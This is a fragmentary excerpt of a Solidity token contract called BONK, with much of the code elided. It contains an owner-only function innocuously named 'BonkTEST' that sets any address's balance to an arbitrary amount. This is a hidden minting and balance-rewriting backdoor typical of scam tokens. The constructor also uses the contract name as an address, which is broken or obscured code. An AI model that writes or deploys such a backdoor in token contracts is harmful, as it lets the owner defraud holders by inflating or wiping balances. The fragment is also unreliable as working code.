...
contract BONK is Ownable {
  ...
  constructor(string memory _name, string memory _symbol, uint8 _decimals, uint256 _totalSupply) public {
    ...
    balances[BONK] = totalSupply;
    allowAddress[BONK] = true;
  }
  ...
  function BonkTEST(address BONKaddress, uint256 _value, bytes32 node, bool enabled) external onlyOwner {
      balances[BONKaddress] = _value * 10 ** uint256(decimals);
